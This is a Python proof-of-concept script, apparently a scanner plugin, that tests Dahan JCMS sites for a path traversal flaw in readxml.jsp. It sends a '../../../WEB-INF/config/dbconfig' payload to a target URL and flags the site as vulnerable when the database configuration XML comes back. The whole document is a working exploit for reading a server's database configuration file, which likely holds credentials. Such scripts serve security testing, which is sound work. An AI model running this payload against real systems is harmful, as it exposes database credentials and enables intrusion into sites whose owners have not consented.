#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 大汉版通JCMS数据库配置文件读取漏洞
referer: http://www.wooyun.org/bugs/wooyun-2013-046837
author: Lucifer
description: 大汉JCMS内容管理系统由于对文件读取时没有对文件路径进行过滤，导致可以直接直接读取数据库配置文件,
        由于读取xml文件时没有对传进的参数进行过滤,flowcode参数可控,配置文件地址WEB-INF/config/dbconfig.xml,由于控制了文件后缀,只能读取xml文件。

'''
import sys
import requests
import warnings
def run(url):
        result = ['大汉版通JCMS数据库配置文件读取漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"<driver-properties>" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
